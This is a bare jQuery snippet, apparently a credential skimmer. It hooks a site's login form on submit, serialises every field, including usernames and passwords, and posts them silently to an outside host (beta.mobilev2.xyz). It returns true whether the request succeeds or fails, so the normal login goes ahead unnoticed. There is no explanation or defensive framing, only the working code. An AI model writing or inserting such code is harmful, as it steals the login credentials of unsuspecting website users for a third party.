$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "https://beta.mobilev2.xyz/json/",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
